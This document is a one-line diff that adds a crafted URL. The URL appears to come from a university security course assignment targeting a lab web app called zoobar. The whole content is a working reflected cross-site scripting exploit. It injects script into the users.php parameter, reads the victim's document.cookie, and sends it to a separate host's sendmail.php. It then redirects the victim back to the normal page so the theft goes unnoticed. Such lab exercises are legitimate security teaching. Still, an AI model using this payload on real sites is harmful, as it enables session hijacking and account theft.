@@ -1,0 +1,1 @@
+zoobar.csl.toronto.edu/users.php?user="><script language%3D"javascript">void((new Image()).src%3D'http%3A%2F%2Fece568.csl.toronto.edu%2Fa3%2Fsendmail.php%3F'%2B'to%3Dwanghan9'%2B'%26netid%3Dyourusername'%2B'%26payload%3D'%2Bdocument.cookie%2B'%26random%3D'%2BMath.random())%3Bthis.document.location.href='http://zoobar.csl.toronto.edu/users.php';<%2Fscript>
